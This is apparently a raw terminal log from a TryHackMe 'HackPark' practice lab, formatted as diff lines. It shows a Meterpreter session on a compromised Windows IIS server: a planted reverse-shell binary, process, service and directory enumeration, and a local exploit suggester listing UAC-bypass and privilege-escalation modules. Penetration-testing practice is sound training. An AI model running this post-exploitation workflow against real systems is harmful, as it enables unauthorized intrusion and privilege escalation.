+ 1988  676   sppsvc.exe
+ 2348  1584  conhost.exe           x64   0        IIS APPPOOL\Blog  C:\Windows\System32\conhost.exe
+ 2404  744   WmiPrvSE.exe
+ 2412  744   WmiPrvSE.exe
+ 2536  676   msdtc.exe
+ 2608  916   taskhostex.exe
+ 2684  2676  explorer.exe
+ 2948  1584  shell.exe             x86   0        IIS APPPOOL\Blog  C:\Users\Public\shell.exe
+ 3008  2540  WScheduler.exe
+
+meterpreter > dir
+Listing: C:\Users\Public
+========================
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+40555/r-xr-xr-x   0      dir   2013-08-22 17:39:30 +0200  Desktop
+40555/r-xr-xr-x   0      dir   2013-08-22 17:39:30 +0200  Documents
+40555/r-xr-xr-x   0      dir   2013-08-22 17:39:30 +0200  Downloads
+40555/r-xr-xr-x   0      dir   2013-08-22 17:39:30 +0200  Libraries
+40555/r-xr-xr-x   0      dir   2013-08-22 17:39:30 +0200  Music
+40555/r-xr-xr-x   0      dir   2013-08-22 17:39:30 +0200  Pictures
+40555/r-xr-xr-x   0      dir   2013-08-22 17:39:30 +0200  Videos
+100666/rw-rw-rw-  174    fil   2013-08-22 17:39:32 +0200  desktop.ini
+100777/rwxrwxrwx  73802  fil   2020-08-07 07:03:51 +0200  shell.exe
+
+meterpreter > cd C:\
+ >
+meterpreter > t
+[-] Unknown command: t.
+meterpreter > cd C:/
+meterpreter > dir
+Listing: C:\
+============
+
+Mode                Size               Type  Last modified                    Name
+----                ----               ----  -------------                    ----
+40777/rwxrwxrwx     0                  dir   2013-08-22 17:39:31 +0200        $Recycle.Bin
+100666/rw-rw-rw-    1                  fil   2013-08-22 17:46:48 +0200        BOOTNXT
+40777/rwxrwxrwx     0                  dir   2013-08-22 16:48:41 +0200        Documents and Settings
+40777/rwxrwxrwx     0                  dir   2013-08-22 17:39:30 +0200        PerfLogs
+40555/r-xr-xr-x     4096               dir   2013-08-22 15:36:16 +0200        Program Files
+40777/rwxrwxrwx     4096               dir   2013-08-22 15:36:16 +0200        Program Files (x86)
+40777/rwxrwxrwx     4096               dir   2013-08-22 15:36:16 +0200        ProgramData
+40777/rwxrwxrwx     0                  dir   2019-08-03 19:40:31 +0200        System Volume Information
+40555/r-xr-xr-x     4096               dir   2013-08-22 15:36:16 +0200        Users
+40777/rwxrwxrwx     24576              dir   2013-08-22 15:36:16 +0200        Windows
+100444/r--r--r--    398356             fil   2013-08-22 17:46:48 +0200        bootmgr
+40777/rwxrwxrwx     4096               dir   2019-08-03 19:45:38 +0200        inetpub
+53201544/r-xr--r--  63890988602523631  fif   2033629137-10-10 11:25:04 +0100  pagefile.sys
+
+meterpreter > cd Program
+cd ProgramData            cd Program\ Files         cd Program\ Files\ (x86)
+meterpreter > cd Program
+cd ProgramData            cd Program\ Files         cd Program\ Files\ (x86)
+meterpreter > cd Program\ Files\ (x86)
+meterpreter > dir
+Listing: C:\Program Files (x86)
+===============================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+40777/rwxrwxrwx   0     dir   2013-08-22 15:36:16 +0200  Common Files
+40777/rwxrwxrwx   0     dir   2013-08-22 17:39:30 +0200  Internet Explorer
+40777/rwxrwxrwx   0     dir   2013-08-22 17:39:30 +0200  Microsoft.NET
+40777/rwxrwxrwx   8192  dir   2019-08-04 13:36:42 +0200  SystemScheduler
+40777/rwxrwxrwx   0     dir   2019-08-06 23:12:04 +0200  Uninstall Information
+40777/rwxrwxrwx   0     dir   2013-08-22 17:39:30 +0200  Windows Mail
+40777/rwxrwxrwx   0     dir   2013-08-22 17:39:30 +0200  Windows NT
+40777/rwxrwxrwx   0     dir   2013-08-22 17:39:30 +0200  WindowsPowerShell
+100666/rw-rw-rw-  174   fil   2013-08-22 17:39:32 +0200  desktop.ini
+
+meterpreter > cd SystemScheduler
+meterpreter > dir
+Listing: C:\Program Files (x86)\SystemScheduler
+===============================================
+
+Mode              Size     Type  Last modified              Name
+----              ----     ----  -------------              ----
+40777/rwxrwxrwx   4096     dir   2019-08-04 13:36:53 +0200  Events
+100666/rw-rw-rw-  60       fil   2019-08-04 13:36:42 +0200  Forum.url
+100666/rw-rw-rw-  9813     fil   2019-08-04 13:36:42 +0200  License.txt
+100666/rw-rw-rw-  871      fil   2019-08-04 13:37:02 +0200  LogFile.txt
+100666/rw-rw-rw-  2805     fil   2019-08-04 13:36:53 +0200  LogfileAdvanced.txt
+100777/rwxrwxrwx  536992   fil   2019-08-04 13:36:42 +0200  Message.exe
+100777/rwxrwxrwx  445344   fil   2019-08-04 13:36:42 +0200  PlaySound.exe
+100777/rwxrwxrwx  27040    fil   2019-08-04 13:36:42 +0200  PlayWAV.exe
+100666/rw-rw-rw-  149      fil   2019-08-04 13:36:53 +0200  Preferences.ini
+100777/rwxrwxrwx  485792   fil   2019-08-04 13:36:42 +0200  Privilege.exe
+100666/rw-rw-rw-  10100    fil   2019-08-04 13:36:42 +0200  ReadMe.txt
+100777/rwxrwxrwx  112544   fil   2019-08-04 13:36:42 +0200  RunNow.exe
+100777/rwxrwxrwx  235936   fil   2019-08-04 13:36:42 +0200  SSAdmin.exe
+100777/rwxrwxrwx  731552   fil   2019-08-04 13:36:42 +0200  SSCmd.exe
+100777/rwxrwxrwx  456608   fil   2019-08-04 13:36:42 +0200  SSMail.exe
+100777/rwxrwxrwx  1633696  fil   2019-08-04 13:36:42 +0200  Scheduler.exe
+100777/rwxrwxrwx  491936   fil   2019-08-04 13:36:42 +0200  SendKeysHelper.exe
+100777/rwxrwxrwx  437664   fil   2019-08-04 13:36:42 +0200  ShowXY.exe
+100777/rwxrwxrwx  439712   fil   2019-08-04 13:36:42 +0200  ShutdownGUI.exe
+100666/rw-rw-rw-  785042   fil   2019-08-04 13:36:42 +0200  WSCHEDULER.CHM
+100666/rw-rw-rw-  703081   fil   2019-08-04 13:36:42 +0200  WSCHEDULER.HLP
+100777/rwxrwxrwx  136096   fil   2019-08-04 13:36:42 +0200  WSCtrl.exe
+100777/rwxrwxrwx  68512    fil   2019-08-04 13:36:42 +0200  WSLogon.exe
+100666/rw-rw-rw-  33184    fil   2019-08-04 13:36:42 +0200  WSProc.dll
+100666/rw-rw-rw-  2026     fil   2019-08-04 13:36:42 +0200  WScheduler.cnt
+100777/rwxrwxrwx  331168   fil   2019-08-04 13:36:42 +0200  WScheduler.exe
+100777/rwxrwxrwx  98720    fil   2019-08-04 13:36:42 +0200  WService.exe
+100666/rw-rw-rw-  54       fil   2019-08-04 13:36:42 +0200  Website.url
+100777/rwxrwxrwx  76704    fil   2019-08-04 13:36:42 +0200  WhoAmI.exe
+100666/rw-rw-rw-  1150     fil   2019-08-04 13:36:42 +0200  alarmclock.ico
+100666/rw-rw-rw-  766      fil   2019-08-04 13:36:42 +0200  clock.ico
+100666/rw-rw-rw-  80856    fil   2019-08-04 13:36:42 +0200  ding.wav
+100666/rw-rw-rw-  1637972  fil   2019-08-04 13:36:42 +0200  libeay32.dll
+100777/rwxrwxrwx  40352    fil   2019-08-04 13:36:42 +0200  sc32.exe
+100666/rw-rw-rw-  766      fil   2019-08-04 13:36:42 +0200  schedule.ico
+100666/rw-rw-rw-  355446   fil   2019-08-04 13:36:42 +0200  ssleay32.dll
+100666/rw-rw-rw-  6999     fil   2019-08-04 13:36:42 +0200  unins000.dat
+100777/rwxrwxrwx  722597   fil   2019-08-04 13:36:42 +0200  unins000.exe
+100666/rw-rw-rw-  6574     fil   2019-08-04 13:36:42 +0200  whiteclock.ico
+
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User              Path
+ ---   ----  ----                  ----  -------  ----              ----
+ 0     0     [System Process]
+ 4     0     System
+ 348   676   svchost.exe
+ 372   4     smss.exe
+ 532   520   csrss.exe
+ 584   576   csrss.exe
+ 592   520   wininit.exe
+ 624   576   winlogon.exe
+ 676   592   services.exe
+ 684   592   lsass.exe
+ 744   676   svchost.exe
+ 788   676   svchost.exe
+ 872   676   svchost.exe
+ 888   624   dwm.exe
+ 916   676   svchost.exe
+ 944   676   svchost.exe
+ 988   676   svchost.exe
+ 1132  676   spoolsv.exe
+ 1148  744   SppExtComObj.Exe
+ 1168  676   amazon-ssm-agent.exe
+ 1212  676   vds.exe
+ 1220  2644  ServerManager.exe
+ 1248  676   svchost.exe
+ 1276  676   LiteAgent.exe
+ 1332  676   svchost.exe
+ 1348  676   svchost.exe
+ 1380  676   WService.exe
+ 1552  676   wlms.exe
+ 1560  1380  WScheduler.exe
+ 1576  676   Ec2Config.exe
+ 1584  1736  cmd.exe               x64   0        IIS APPPOOL\Blog  C:\Windows\System32\cmd.exe
+ 1736  1348  w3wp.exe              x64   0        IIS APPPOOL\Blog  C:\Windows\System32\inetsrv\w3wp.exe
+ 1868  676   svchost.exe
+ 1912  3008  Message.exe
+ 1988  676   sppsvc.exe
+ 2348  1584  conhost.exe           x64   0        IIS APPPOOL\Blog  C:\Windows\System32\conhost.exe
+ 2404  744   WmiPrvSE.exe
+ 2412  744   WmiPrvSE.exe
+ 2536  676   msdtc.exe
+ 2608  916   taskhostex.exe
+ 2684  2676  explorer.exe
+ 2948  1584  shell.exe             x86   0        IIS APPPOOL\Blog  C:\Users\Public\shell.exe
+ 3008  2540  WScheduler.exe
+
+meterpreter >
+meterpreter > services
+[-] Unknown command: services.
+meterpreter > get services
+[-] Unknown command: get.
+meterpreter > dir
+Listing: C:\Program Files (x86)\SystemScheduler
+===============================================
+
+Mode              Size     Type  Last modified              Name
+----              ----     ----  -------------              ----
+40777/rwxrwxrwx   4096     dir   2019-08-04 13:36:53 +0200  Events
+100666/rw-rw-rw-  60       fil   2019-08-04 13:36:42 +0200  Forum.url
+100666/rw-rw-rw-  9813     fil   2019-08-04 13:36:42 +0200  License.txt
+100666/rw-rw-rw-  871      fil   2019-08-04 13:37:02 +0200  LogFile.txt
+100666/rw-rw-rw-  2805     fil   2019-08-04 13:36:53 +0200  LogfileAdvanced.txt
+100777/rwxrwxrwx  536992   fil   2019-08-04 13:36:42 +0200  Message.exe
+100777/rwxrwxrwx  445344   fil   2019-08-04 13:36:42 +0200  PlaySound.exe
+100777/rwxrwxrwx  27040    fil   2019-08-04 13:36:42 +0200  PlayWAV.exe
+100666/rw-rw-rw-  149      fil   2019-08-04 13:36:53 +0200  Preferences.ini
+100777/rwxrwxrwx  485792   fil   2019-08-04 13:36:42 +0200  Privilege.exe
+100666/rw-rw-rw-  10100    fil   2019-08-04 13:36:42 +0200  ReadMe.txt
+100777/rwxrwxrwx  112544   fil   2019-08-04 13:36:42 +0200  RunNow.exe
+100777/rwxrwxrwx  235936   fil   2019-08-04 13:36:42 +0200  SSAdmin.exe
+100777/rwxrwxrwx  731552   fil   2019-08-04 13:36:42 +0200  SSCmd.exe
+100777/rwxrwxrwx  456608   fil   2019-08-04 13:36:42 +0200  SSMail.exe
+100777/rwxrwxrwx  1633696  fil   2019-08-04 13:36:42 +0200  Scheduler.exe
+100777/rwxrwxrwx  491936   fil   2019-08-04 13:36:42 +0200  SendKeysHelper.exe
+100777/rwxrwxrwx  437664   fil   2019-08-04 13:36:42 +0200  ShowXY.exe
+100777/rwxrwxrwx  439712   fil   2019-08-04 13:36:42 +0200  ShutdownGUI.exe
+100666/rw-rw-rw-  785042   fil   2019-08-04 13:36:42 +0200  WSCHEDULER.CHM
+100666/rw-rw-rw-  703081   fil   2019-08-04 13:36:42 +0200  WSCHEDULER.HLP
+100777/rwxrwxrwx  136096   fil   2019-08-04 13:36:42 +0200  WSCtrl.exe
+100777/rwxrwxrwx  68512    fil   2019-08-04 13:36:42 +0200  WSLogon.exe
+100666/rw-rw-rw-  33184    fil   2019-08-04 13:36:42 +0200  WSProc.dll
+100666/rw-rw-rw-  2026     fil   2019-08-04 13:36:42 +0200  WScheduler.cnt
+100777/rwxrwxrwx  331168   fil   2019-08-04 13:36:42 +0200  WScheduler.exe
+100777/rwxrwxrwx  98720    fil   2019-08-04 13:36:42 +0200  WService.exe
+100666/rw-rw-rw-  54       fil   2019-08-04 13:36:42 +0200  Website.url
+100777/rwxrwxrwx  76704    fil   2019-08-04 13:36:42 +0200  WhoAmI.exe
+100666/rw-rw-rw-  1150     fil   2019-08-04 13:36:42 +0200  alarmclock.ico
+100666/rw-rw-rw-  766      fil   2019-08-04 13:36:42 +0200  clock.ico
+100666/rw-rw-rw-  80856    fil   2019-08-04 13:36:42 +0200  ding.wav
+100666/rw-rw-rw-  1637972  fil   2019-08-04 13:36:42 +0200  libeay32.dll
+100777/rwxrwxrwx  40352    fil   2019-08-04 13:36:42 +0200  sc32.exe
+100666/rw-rw-rw-  766      fil   2019-08-04 13:36:42 +0200  schedule.ico
+100666/rw-rw-rw-  355446   fil   2019-08-04 13:36:42 +0200  ssleay32.dll
+100666/rw-rw-rw-  6999     fil   2019-08-04 13:36:42 +0200  unins000.dat
+100777/rwxrwxrwx  722597   fil   2019-08-04 13:36:42 +0200  unins000.exe
+100666/rw-rw-rw-  6574     fil   2019-08-04 13:36:42 +0200  whiteclock.ico
+
+meterpreter >
+meterpreter > cd ..
+meterpreter > dir
+Listing: C:\Program Files (x86)
+===============================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+40777/rwxrwxrwx   0     dir   2013-08-22 15:36:16 +0200  Common Files
+40777/rwxrwxrwx   0     dir   2013-08-22 17:39:30 +0200  Internet Explorer
+40777/rwxrwxrwx   0     dir   2013-08-22 17:39:30 +0200  Microsoft.NET
+40777/rwxrwxrwx   8192  dir   2019-08-04 13:36:42 +0200  SystemScheduler
+40777/rwxrwxrwx   0     dir   2019-08-06 23:12:04 +0200  Uninstall Information
+40777/rwxrwxrwx   0     dir   2013-08-22 17:39:30 +0200  Windows Mail
+40777/rwxrwxrwx   0     dir   2013-08-22 17:39:30 +0200  Windows NT
+40777/rwxrwxrwx   0     dir   2013-08-22 17:39:30 +0200  WindowsPowerShell
+100666/rw-rw-rw-  174   fil   2013-08-22 17:39:32 +0200  desktop.ini
+
+meterpreter > load powershell
+Loading extension powershell...Success.
+meterpreter > powershell_shell
+PS > get-service
+ERROR: -service : The term '-service' is not recognized as the name of a cmdlet, function, script file, or operable program.
+EERROR: + -service
+ERROR: + ~~~~~~~~
+ERROR:     + CategoryInfo          : ObjectNotFound: (-service:String) [], CommandNotFoundException
+ERROR:     + FullyQualifiedErrorId : CommandNotFoundException
+ERROR:
+PS > Get-Service
+
+Status   Name               DisplayName
+------   ----               -----------
+Stopped  AeLookupSvc        Application Experience
+Stopped  ALG                Application Layer Gateway Service
+Running  AmazonSSMAgent     Amazon SSM Agent
+Running  AppHostSvc         Application Host Helper Service
+Stopped  AppIDSvc           Application Identity
+Stopped  Appinfo            Application Information
+Stopped  AppMgmt            Application Management
+Stopped  AppReadiness       App Readiness
+Stopped  AppXSvc            AppX Deployment Service (AppXSVC)
+Stopped  aspnet_state       ASP.NET State Service
+Stopped  AudioEndpointBu... Windows Audio Endpoint Builder
+Stopped  Audiosrv           Windows Audio
+Running  AWSLiteAgent       AWS Lite Guest Agent
+Running  BFE                Base Filtering Engine
+Stopped  BITS               Background Intelligent Transfer Ser...
+Running  BrokerInfrastru... Background Tasks Infrastructure Ser...
+Stopped  Browser            Computer Browser
+Running  CertPropSvc        Certificate Propagation
+Stopped  COMSysApp          COM+ System Application
+Running  CryptSvc           Cryptographic Services
+Running  DcomLaunch         DCOM Server Process Launcher
+Stopped  defragsvc          Optimize drives
+Stopped  DeviceAssociati... Device Association Service
+Stopped  DeviceInstall      Device Install Service
+Running  Dhcp               DHCP Client
+Running  Dnscache           DNS Client
+Stopped  dot3svc            Wired AutoConfig
+Running  DPS                Diagnostic Policy Service
+Running  DsmSvc             Device Setup Manager
+Stopped  Eaphost            Extensible Authentication Protocol
+Running  Ec2Config          Ec2Config
+Stopped  EFS                Encrypting File System (EFS)
+Running  EventLog           Windows Event Log
+Running  EventSystem        COM+ Event System
+Stopped  fdPHost            Function Discovery Provider Host
+Stopped  FDResPub           Function Discovery Resource Publica...
+Running  FontCache          Windows Font Cache Service
+Running  gpsvc              Group Policy Client
+Stopped  hidserv            Human Interface Device Service
+Stopped  hkmsvc             Health Key and Certificate Management
+Stopped  IEEtwCollectorS... Internet Explorer ETW Collector Ser...
+Stopped  IKEEXT             IKE and AuthIP IPsec Keying Modules
+Running  iphlpsvc           IP Helper
+Stopped  KeyIso             CNG Key Isolation
+Stopped  KPSSVC             KDC Proxy Server service (KPS)
+Stopped  KtmRm              KtmRm for Distributed Transaction C...
+Running  LanmanServer       Server
+Running  LanmanWorkstation  Workstation
+Stopped  lltdsvc            Link-Layer Topology Discovery Mapper
+Running  lmhosts            TCP/IP NetBIOS Helper
+Running  LSM                Local Session Manager
+Stopped  MMCSS              Multimedia Class Scheduler
+Running  MpsSvc             Windows Firewall
+Running  MSDTC              Distributed Transaction Coordinator
+Stopped  MSiSCSI            Microsoft iSCSI Initiator Service
+Stopped  msiserver          Windows Installer
+Stopped  napagent           Network Access Protection Agent
+Stopped  NcaSvc             Network Connectivity Assistant
+Stopped  Netlogon           Netlogon
+Stopped  Netman             Network Connections
+Running  netprofm           Network List Service
+Stopped  NetTcpPortSharing  Net.Tcp Port Sharing Service
+Running  NlaSvc             Network Location Awareness
+Running  nsi                Network Store Interface Service
+Stopped  PerfHost           Performance Counter DLL Host
+Stopped  pla                Performance Logs & Alerts
+Running  PlugPlay           Plug and Play
+Stopped  PolicyAgent        IPsec Policy Agent
+Running  Power              Power
+Stopped  PrintNotify        Printer Extensions and Notifications
+Running  ProfSvc            User Profile Service
+Stopped  PsShutdownSvc      PsShutdown
+Stopped  RasAuto            Remote Access Auto Connection Manager
+Stopped  RasMan             Remote Access Connection Manager
+Stopped  RemoteAccess       Routing and Remote Access
+Stopped  RemoteRegistry     Remote Registry
+Running  RpcEptMapper       RPC Endpoint Mapper
+Stopped  RpcLocator         Remote Procedure Call (RPC) Locator
+Running  RpcSs              Remote Procedure Call (RPC)
+Stopped  RSoPProv           Resultant Set of Policy Provider
+Stopped  sacsvr             Special Administration Console Helper
+Running  SamSs              Security Accounts Manager
+Stopped  SCardSvr           Smart Card
+Stopped  ScDeviceEnum       Smart Card Device Enumeration Service
+Running  Schedule           Task Scheduler
+Stopped  SCPolicySvc        Smart Card Removal Policy
+Stopped  seclogon           Secondary Logon
+Running  SENS               System Event Notification Service
+Running  SessionEnv         Remote Desktop Configuration
+Stopped  SharedAccess       Internet Connection Sharing (ICS)
+Running  ShellHWDetection   Shell Hardware Detection
+Stopped  smphost            Microsoft Storage Spaces SMP
+Stopped  SNMPTRAP           SNMP Trap
+Running  Spooler            Print Spooler
+Running  sppsvc             Software Protection
+Stopped  SstpSvc            Secure Socket Tunneling Protocol Se...
+Stopped  svsvc              Spot Verifier
+Stopped  swprv              Microsoft Software Shadow Copy Prov...
+Stopped  SysMain            Superfetch
+Running  SystemEventsBroker System Events Broker
+Stopped  TapiSrv            Telephony
+Running  TermService        Remote Desktop Services
+Running  Themes             Themes
+Stopped  THREADORDER        Thread Ordering Server
+Stopped  TieringEngineSe... Storage Tiers Management
+Running  TrkWks             Distributed Link Tracking Client
+Stopped  TrustedInstaller   Windows Modules Installer
+Running  UALSVC             User Access Logging Service
+Stopped  UI0Detect          Interactive Services Detection
+Running  UmRdpService       Remote Desktop Services UserMode Po...
+Stopped  VaultSvc           Credential Manager
+Stopped  vds                Virtual Disk
+Stopped  vmicguestinterface Hyper-V Guest Service Interface
+Stopped  vmicheartbeat      Hyper-V Heartbeat Service
+Stopped  vmickvpexchange    Hyper-V Data Exchange Service
+Stopped  vmicrdv            Hyper-V Remote Desktop Virtualizati...
+Stopped  vmicshutdown       Hyper-V Guest Shutdown Service
+Stopped  vmictimesync       Hyper-V Time Synchronization Service
+Stopped  vmicvss            Hyper-V Volume Shadow Copy Requestor
+Stopped  VSS                Volume Shadow Copy
+Running  W32Time            Windows Time
+Stopped  w3logsvc           W3C Logging Service
+Running  W3SVC              World Wide Web Publishing Service
+Running  WAS                Windows Process Activation Service
+Running  Wcmsvc             Windows Connection Manager
+Stopped  WcsPlugInService   Windows Color System
+Stopped  WdiServiceHost     Diagnostic Service Host
+Stopped  WdiSystemHost      Diagnostic System Host
+Stopped  Wecsvc             Windows Event Collector
+Stopped  WEPHOSTSVC         Windows Encryption Provider Host Se...
+Stopped  wercplsupport      Problem Reports and Solutions Contr...
+Stopped  WerSvc             Windows Error Reporting Service
+Running  WindowsScheduler   System Scheduler Service
+Running  WinHttpAutoProx... WinHTTP Web Proxy Auto-Discovery Se...
+Running  Winmgmt            Windows Management Instrumentation
+Running  WinRM              Windows Remote Management (WS-Manag...
+Running  WLMS               Windows Licensing Monitoring Service
+Stopped  wmiApSrv           WMI Performance Adapter
+Stopped  WPDBusEnum         Portable Device Enumerator Service
+Stopped  WSService          Windows Store Service (WSService)
+Stopped  wuauserv           Windows Update
+Stopped  wudfsvc            Windows Driver Foundation - User-mo...
+
+
+PS > exit
+PS > exit
+PS > quit
+ERROR: quit : The term 'quit' is not recognized as the name of a cmdlet, function, script file, or operable program. Check
+ERROR: the spelling of the name, or if a path was included, verify that the path is correct and try again.
+ERROR: At line:1 char:1
+ERROR: + quit
+EERROR:     + CategoryInfo          : ObjectNotFound: (quit:String) [], CommandNotFoundException
+ERROR:     + FullyQualifiedErrorId : CommandNotFoundException
+ERROR:
+PS > quit
+ERROR: quit : The term 'quit' is not recognized as the name of a cmdlet, function, script file, or operable program. Check
+ERROR: the spelling of the name, or if a path was included, verify that the path is correct and try again.
+ERROR: At line:1 char:1
+ERROR: + quit
+EEPS >
+PS >
+PS >
+PS > ^Z
+Background channel 1? [y/N]
+[1]+  Stopped                 sudo msfdb run
+user@kali:~/tryhackme/hackpark$ kill %1
+-bash: kill: (3338) - Operation not permitted
+
+[1]+  Stopped                 sudo msfdb run
+user@kali:~/tryhackme/hackpark$ fg
+sudo msfdb run
+
+
+PS > ?
+ERROR: Where-Object : Cannot process command because of one or more missing mandatory parameters: Property.
+ERROR: At line:1 char:1
+ERROR: + ?
+ERROR: + ~
+EERROR:     + FullyQualifiedErrorId : MissingMandatoryParameter,Microsoft.PowerShell.Commands.WhereObjectCommand
+ERROR:
+PS > sysinfo
+ERROR: sysinfo : The term 'sysinfo' is not recognized as the name of a cmdlet, function, script file, or operable program.
+ERROR: Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+ERROR: At line:1 char:1
+ERROR: + sysinfo
+EERROR:     + CategoryInfo          : ObjectNotFound: (sysinfo:String) [], CommandNotFoundException
+ERROR:     + FullyQualifiedErrorId : CommandNotFoundException
+ERROR:
+PS > ^Z
+[1]+  Stopped                 sudo msfdb run
+user@kali:~/tryhackme/hackpark$
+Background channel 1? [y/N]  y
+-bash: y: command not found
+user@kali:~/tryhackme/hackpark$ fg
+sudo msfdb run
+y
+meterpreter > dir
+Listing: C:\Program Files (x86)
+===============================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+40777/rwxrwxrwx   0     dir   2013-08-22 15:36:16 +0200  Common Files
+40777/rwxrwxrwx   4096  dir   2013-08-22 17:39:30 +0200  Internet Explorer
+40777/rwxrwxrwx   0     dir   2013-08-22 17:39:30 +0200  Microsoft.NET
+40777/rwxrwxrwx   8192  dir   2019-08-04 13:36:42 +0200  SystemScheduler
+40777/rwxrwxrwx   0     dir   2019-08-06 23:12:04 +0200  Uninstall Information
+40777/rwxrwxrwx   0     dir   2013-08-22 17:39:30 +0200  Windows Mail
+40777/rwxrwxrwx   0     dir   2013-08-22 17:39:30 +0200  Windows NT
+40777/rwxrwxrwx   0     dir   2013-08-22 17:39:30 +0200  WindowsPowerShell
+100666/rw-rw-rw-  174   fil   2013-08-22 17:39:32 +0200  desktop.ini
+
+meterpreter > cd SystemSchedules
+[-] stdapi_fs_chdir: Operation failed: The system cannot find the file specified.
+meterpreter > dir
+Listing: C:\Program Files (x86)
+===============================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+40777/rwxrwxrwx   0     dir   2013-08-22 15:36:16 +0200  Common Files
+40777/rwxrwxrwx   4096  dir   2013-08-22 17:39:30 +0200  Internet Explorer
+40777/rwxrwxrwx   0     dir   2013-08-22 17:39:30 +0200  Microsoft.NET
+40777/rwxrwxrwx   8192  dir   2019-08-04 13:36:42 +0200  SystemScheduler
+40777/rwxrwxrwx   0     dir   2019-08-06 23:12:04 +0200  Uninstall Information
+40777/rwxrwxrwx   0     dir   2013-08-22 17:39:30 +0200  Windows Mail
+40777/rwxrwxrwx   0     dir   2013-08-22 17:39:30 +0200  Windows NT
+40777/rwxrwxrwx   0     dir   2013-08-22 17:39:30 +0200  WindowsPowerShell
+100666/rw-rw-rw-  174   fil   2013-08-22 17:39:32 +0200  desktop.ini
+
+meterpreter > cd SystemScheduler
+meterpreter > dir
+Listing: C:\Program Files (x86)\SystemScheduler
+===============================================
+
+Mode              Size     Type  Last modified              Name
+----              ----     ----  -------------              ----
+40777/rwxrwxrwx   4096     dir   2019-08-04 13:36:53 +0200  Events
+100666/rw-rw-rw-  60       fil   2019-08-04 13:36:42 +0200  Forum.url
+100666/rw-rw-rw-  9813     fil   2019-08-04 13:36:42 +0200  License.txt
+100666/rw-rw-rw-  871      fil   2019-08-04 13:37:02 +0200  LogFile.txt
+100666/rw-rw-rw-  2805     fil   2019-08-04 13:36:53 +0200  LogfileAdvanced.txt
+100777/rwxrwxrwx  536992   fil   2019-08-04 13:36:42 +0200  Message.exe
+100777/rwxrwxrwx  445344   fil   2019-08-04 13:36:42 +0200  PlaySound.exe
+100777/rwxrwxrwx  27040    fil   2019-08-04 13:36:42 +0200  PlayWAV.exe
+100666/rw-rw-rw-  149      fil   2019-08-04 13:36:53 +0200  Preferences.ini
+100777/rwxrwxrwx  485792   fil   2019-08-04 13:36:42 +0200  Privilege.exe
+100666/rw-rw-rw-  10100    fil   2019-08-04 13:36:42 +0200  ReadMe.txt
+100777/rwxrwxrwx  112544   fil   2019-08-04 13:36:42 +0200  RunNow.exe
+100777/rwxrwxrwx  235936   fil   2019-08-04 13:36:42 +0200  SSAdmin.exe
+100777/rwxrwxrwx  731552   fil   2019-08-04 13:36:42 +0200  SSCmd.exe
+100777/rwxrwxrwx  456608   fil   2019-08-04 13:36:42 +0200  SSMail.exe
+100777/rwxrwxrwx  1633696  fil   2019-08-04 13:36:42 +0200  Scheduler.exe
+100777/rwxrwxrwx  491936   fil   2019-08-04 13:36:42 +0200  SendKeysHelper.exe
+100777/rwxrwxrwx  437664   fil   2019-08-04 13:36:42 +0200  ShowXY.exe
+100777/rwxrwxrwx  439712   fil   2019-08-04 13:36:42 +0200  ShutdownGUI.exe
+100666/rw-rw-rw-  785042   fil   2019-08-04 13:36:42 +0200  WSCHEDULER.CHM
+100666/rw-rw-rw-  703081   fil   2019-08-04 13:36:42 +0200  WSCHEDULER.HLP
+100777/rwxrwxrwx  136096   fil   2019-08-04 13:36:42 +0200  WSCtrl.exe
+100777/rwxrwxrwx  68512    fil   2019-08-04 13:36:42 +0200  WSLogon.exe
+100666/rw-rw-rw-  33184    fil   2019-08-04 13:36:42 +0200  WSProc.dll
+100666/rw-rw-rw-  2026     fil   2019-08-04 13:36:42 +0200  WScheduler.cnt
+100777/rwxrwxrwx  331168   fil   2019-08-04 13:36:42 +0200  WScheduler.exe
+100777/rwxrwxrwx  98720    fil   2019-08-04 13:36:42 +0200  WService.exe
+100666/rw-rw-rw-  54       fil   2019-08-04 13:36:42 +0200  Website.url
+100777/rwxrwxrwx  76704    fil   2019-08-04 13:36:42 +0200  WhoAmI.exe
+100666/rw-rw-rw-  1150     fil   2019-08-04 13:36:42 +0200  alarmclock.ico
+100666/rw-rw-rw-  766      fil   2019-08-04 13:36:42 +0200  clock.ico
+100666/rw-rw-rw-  80856    fil   2019-08-04 13:36:42 +0200  ding.wav
+100666/rw-rw-rw-  1637972  fil   2019-08-04 13:36:42 +0200  libeay32.dll
+100777/rwxrwxrwx  40352    fil   2019-08-04 13:36:42 +0200  sc32.exe
+100666/rw-rw-rw-  766      fil   2019-08-04 13:36:42 +0200  schedule.ico
+100666/rw-rw-rw-  355446   fil   2019-08-04 13:36:42 +0200  ssleay32.dll
+100666/rw-rw-rw-  6999     fil   2019-08-04 13:36:42 +0200  unins000.dat
+100777/rwxrwxrwx  722597   fil   2019-08-04 13:36:42 +0200  unins000.exe
+100666/rw-rw-rw-  6574     fil   2019-08-04 13:36:42 +0200  whiteclock.ico
+
+meterpreter > systeminfo
+[-] Unknown command: systeminfo.
+meterpreter > sysinfo
+Computer        : HACKPARK
+OS              : Windows 2012 R2 (6.3 Build 9600).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x86/windows
+meterpreter > run post/multi/recon/local_exploit_suggester
+
+[*] 10.10.207.167 - Collecting local exploits for x86/windows...
+[*] 10.10.207.167 - 34 exploit checks are being tried...
+[+] 10.10.207.167 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+nil versions are discouraged and will be deprecated in Rubygems 4
+[+] 10.10.207.167 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
+[+] 10.10.207.167 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+[+] 10.10.207.167 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
+meterpreter > run post/multi/recon/local_exploit_suggester SHOWDESCRIPTION=true
+
+[*] 10.10.207.167 - Collecting local exploits for x86/windows...
+[*] 10.10.207.167 - 34 exploit checks are being tried...
+[+] 10.10.207.167 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+  This module will bypass Windows UAC by hijacking a special key in
